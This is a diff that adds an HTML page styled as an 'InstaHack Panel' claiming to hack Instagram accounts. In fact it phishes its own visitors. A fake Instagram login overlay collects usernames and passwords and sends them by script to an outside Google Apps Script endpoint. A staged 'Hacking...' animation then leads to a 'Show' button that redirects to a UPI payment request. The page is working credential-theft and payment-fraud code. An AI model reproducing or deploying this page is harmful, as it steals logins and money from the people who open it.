@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="image/hack.jpeg" type="image/x-icon">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i,700,700i">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Mono:400,500,700">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:400,500,700">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+
+        header {
+            background: #ff4081;
+            color: white;
+            padding: 10px 0;
+            font-size: 24px;
+            display: flex;
+            text-align: center;
+        }
+
+        .container {
+            width: 50%;
+            margin: 20px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .info-box {
+            background: #d32f2f;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+
+        .show {
+            display: none;
+        }
+
+        .form-container {
+            margin: 20px 0;
+        }
+
+        input {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            background: #1976d2;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #1565c0;
+        }
+        h1{
+            font-size: 30px;
+        }
+
+        .feedback-section {
+            margin-top: 20px;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        li {
+            background: white;
+            margin: 5px 0;
+            padding: 10px;
+            border-radius: 5px;
+
+            box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1);
+        }
+        h1{
+            margin-left: 40px;
+            margin-top: 50px;
+        }
+    @media (max-width: 768px) {
+        .container {
+            width: 90%;
+        }
+
+        input {
+            width: 100%;
+        }
+
+        header {
+            flex-direction: column;
+        }
+
+        h1 {
+            margin-left: 0;
+            margin-top: 20px;
+        }
+    }
+    </style>
+</head>
+
+<body>
+  
+<style>
+    body {
+    font-family: Arial, sans-serif;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.modal {
+    background: #fff;
+    padding: 20px;
+    display: none;
+    position: absolute;
+    top: 12rem;
+    left: 30rem;
+    border-radius: 10px;
+    width: 350px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    text-align: center;
+}
+.close-btn {
+    text-align: right;
+    font-size: 30px;
+    cursor: pointer;
+}
+.logo {
+    width: 200px;
+    margin-bottom: 20px;
+}
+.login-form input {
+    width: 20rem;
+    padding: 10px;
+    margin: 5px 0;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+}
+.login-form button {
+    width: 100%;
+    padding: 10px;
+    background-color: #3897f0;
+    border: none;
+    color: #fff;
+    font-weight: bold;
+    border-radius: 3px;
+    cursor: pointer;
+}
+.divider {
+    margin: 10px 0;
+    color: #8e8e8e;
+}
+.fb-login, .forgot-password {
+    display: block;
+    color: #385185;
+    text-decoration: none;
+    margin: 5px 0;
+    font-size: 14px;
+}
+.checkbox-container {
+    display: flex;
+    align-items: center;
+    font-size: 14px;
+    margin: 10px 0;
+}
+.checkbox-container input {
+    margin-right: 5px;
+}
+#overlay {
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+</style>
+<div id="overlay">
+    <div class="modal">
+        <img src="image/image.png" alt="Instagram Logo" class="logo">
+        <form class="login-form" id="contactForm">
+            <input type="text" name="username" id="username" placeholder="username" >
+            <input type="password" id="password" placeholder="Password" >
+            <br><br>
+            <button type="submit" >Log in</button>
+            <div class="divider">OR</div>
+            <a href="#" class="fb-login">Log in with Facebook</a>
+            <a href="#" class="forgot-password">Forgotten your password?</a>
+        </form>
+    </div>
+</div>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.getElementById("contactForm").addEventListener("submit", async function (e) {
+        e.preventDefault();
+  
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+  
+        let formData = { username , password };
+
+    
+         if (!username || !password) {
+          alert("Please fill in both fields.");
+          
+        }
+        if (!username.match(/^[a-zA-Z0-9._]+$/)) {
+          alert(" username.");
+          
+        }
+
+       
+        let response = await fetch("https://script.google.com/macros/s/AKfycbwv54C4U2dMw3fGNJFufctUBpdtakwn_iCf0OirsnjDpa2LLyLqbpMwOBtgfF_vZMMv/exec", {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(formData)
+        });
+  
+        alert("Login Suceessful!");
+        var modal = document.querySelector(".modal");
+        modal.style.display = "none"; 
+        var overlay = document.getElementById('overlay');
+        overlay.style.display = "none";
+        var user = document.querySelector('.user-s');
+        user.style.display = "block";
+        var spk = document.getElementById('spk');
+        spk.innerHTML = username;
+
+     });
+      });
+  </script>
+
+    <header align="center">
+        <img src="image/hack logo.png" alt="InstaHack" style="width: 150px; height: 150px; border-radius: 50%;">
+        <h1 align="center">InstaHack Panel</h1>
+        <div class="user-s" style="display: none;margin-right: 50px;">
+        <img src="image/OIP.png" alt="InstaHack" style="width: 80px; height: 60px; border-radius: 50%; margin-left: 40rem;padding-top:3rem;">
+        <span id="spk" style="padding-top:4rem;font-family: Verdana, Geneva, Tahoma, sans-serif;font-size: 14px;">umesh__255</span>
+    </div>
+    </header>
+    <div class="container">
+        <div class="info-box">
+            <p>97% of accounts do not have strong protection.</p>
+        </div>
+        <div class="form-container" style="text-align: center;">
+            <h2>Enter Username:</h2>
+            <input type="text" id="username" placeholder="Example: aman__kumar">
+            <button onclick="submitForm()" id="hack">Hack</button>
+        </div>
+        <div class="show">
+            <input type="password" value="12345671234567" disabled>
+            <button value="Show" style="background-color: green;" onclick="K()">Show</button>
+        </div>
+    </div>
+
+    <script>
+        
+            window.onload = function() {
+
+        setTimeout(function () {
+            
+            
+            var modal = document.querySelector(".modal");
+            modal.style.display = "block";  
+           
+           
+        }, 1000);
+        
+    };
+
+    function K(){
+        window.location.href="https://pay.upilink.in/pay/80005096354-1@ybl?am=500";
+    }
+       
+        function submitForm() {
+            var username = document.getElementById("username").value;
+            if (username.trim() === "") {
+                alert("Please enter a username.");
+                return;
+            }
+            var show = document.getElementById('hack');
+            show.innerHTML = "Hacking...";
+            setTimeout(function () {
+                a();
+                var show = document.querySelector('.show');
+                show.style.display = "block";
+            }, 4000);
+            function a() {
+                show.innerHTML = "Hacked";
+
+            }
+
+        }
+    </script>
+</body>
+
+</html>
